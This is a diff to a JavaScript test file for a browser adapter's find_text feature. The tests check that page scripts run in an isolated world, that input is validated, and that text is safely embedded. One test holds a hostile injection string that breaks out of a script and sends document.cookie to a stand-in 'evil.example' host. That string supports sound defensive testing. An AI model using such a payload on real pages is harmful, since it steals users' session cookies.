@@ -533,9 +533,39 @@ test("observe() never shortens the name of an interactive element or a heading, 
 
 // --- find_text: the planner names text, the host finds it on the page and scrolls it into view ---
 
+// find_text runs in the host's isolated world: a page script can neither read the words nor fake the result.
+function isolatedFindView({ executeJavaScript }) {
+  const mainWorld = [];
+  return {
+    mainWorld,
+    webContents: {
+      loadURL: async () => {},
+      stop: () => {},
+      executeJavaScript: async (script) => { mainWorld.push(script); return executeJavaScript(script); },
+      executeJavaScriptInIsolatedWorld: async (_worldId, scripts) => executeJavaScript(scripts[0].code),
+    },
+  };
+}
+
+test("execute(find_text) never runs in the page's own world, where page scripts could read the words", async () => {
+  const view = isolatedFindView({ executeJavaScript: async (script) => (script.includes("__haloFindText") ? { found: true, count: 1 } : { url: "https://example.com/", title: "", text: "", elements: [] }) });
+  const adapter = new BrowserAdapter({ view });
+  assert.equal((await adapter.execute({ type: "find_text", text: "Order 4417-2209" })).status, "ok");
+  assert.equal(view.mainWorld.some((script) => script.includes("__haloFindText")), false);
+});
+
+test("execute(find_text) finds nothing rather than fall back to the page's world when there is no isolated world", async () => {
+  const seen = [];
+  const view = makeFakeView({ executeJavaScript: async (script) => { seen.push(script); return { url: "https://example.com/", title: "", text: "", elements: [] }; } });
+  const adapter = new BrowserAdapter({ view });
+  assert.deepEqual(await adapter.execute({ type: "find_text", text: "x" }), { status: "failed", errorCode: "find_text_failed" });
+  assert.equal(seen.some((script) => script.includes("__haloFindText")), false);
+});
+
+
 test("execute(find_text) scrolls the first match into view and reports how many matched", async () => {
   const scripts = [];
-  const view = makeFakeView({
+  const view = isolatedFindView({
     executeJavaScript: async (script) => {
       scripts.push(script);
       if (script.includes("__haloFindText")) return { found: true, count: 3 };
@@ -550,14 +580,14 @@ test("execute(find_text) scrolls the first match into view and reports how many 
 });
 
 test("execute(find_text) fails with text_not_found when the page has no match", async () => {
-  const view = makeFakeView({ executeJavaScript: async (script) => script.includes("__haloFindText") ? { found: false, count: 0 } : { url: "https://example.com/", title: "", text: "", elements: [] } });
+  const view = isolatedFindView({ executeJavaScript: async (script) => script.includes("__haloFindText") ? { found: false, count: 0 } : { url: "https://example.com/", title: "", text: "", elements: [] } });
   const adapter = new BrowserAdapter({ view });
   assert.deepEqual(await adapter.execute({ type: "find_text", text: "nothing here" }), { status: "failed", errorCode: "text_not_found" });
 });
 
 test("execute(find_text) rejects empty, non-string and oversized text without running a script", async () => {
   let ran = false;
-  const view = makeFakeView({ executeJavaScript: async (script) => { if (script.includes("__haloFindText")) ran = true; return { url: "https://example.com/", title: "", text: "", elements: [] }; } });
+  const view = isolatedFindView({ executeJavaScript: async (script) => { if (script.includes("__haloFindText")) ran = true; return { url: "https://example.com/", title: "", text: "", elements: [] }; } });
   const adapter = new BrowserAdapter({ view });
   for (const text of ["", "   ", 7, null, undefined, "x".repeat(201)]) {
     assert.deepEqual(await adapter.execute({ type: "find_text", text }), { status: "failed", errorCode: "invalid_find_text" }, JSON.stringify(text));
@@ -567,7 +597,7 @@ test("execute(find_text) rejects empty, non-string and oversized text without ru
 
 test("execute(find_text) puts the text in the script as one JSON string, so quotes and tags cannot end it", async () => {
   const scripts = [];
-  const view = makeFakeView({ executeJavaScript: async (script) => { scripts.push(script); return script.includes("__haloFindText") ? { found: true, count: 1 } : { url: "https://example.com/", title: "", text: "", elements: [] }; } });
+  const view = isolatedFindView({ executeJavaScript: async (script) => { scripts.push(script); return script.includes("__haloFindText") ? { found: true, count: 1 } : { url: "https://example.com/", title: "", text: "", elements: [] }; } });
   const adapter = new BrowserAdapter({ view });
   const hostile = '"); fetch("https://evil.example/?"+document.cookie); ("</script>`${1}';
   await adapter.execute({ type: "find_text", text: hostile });
@@ -578,7 +608,7 @@ test("execute(find_text) puts the text in the script as one JSON string, so quot
 
 test("execute(find_text) rejects a stale documentEpoch without searching", async () => {
   let ran = false;
-  const view = makeFakeView({ executeJavaScript: async (script) => { if (script.includes("__haloFindText")) ran = true; return { url: "https://example.com/", title: "", text: "", elements: [] }; } });
+  const view = isolatedFindView({ executeJavaScript: async (script) => { if (script.includes("__haloFindText")) ran = true; return { url: "https://example.com/", title: "", text: "", elements: [] }; } });
   const adapter = new BrowserAdapter({ view });
   const result = await adapter.execute({ type: "find_text", text: "x" }, { documentEpoch: 99 });
   assert.equal(result.errorCode, "stale_document");
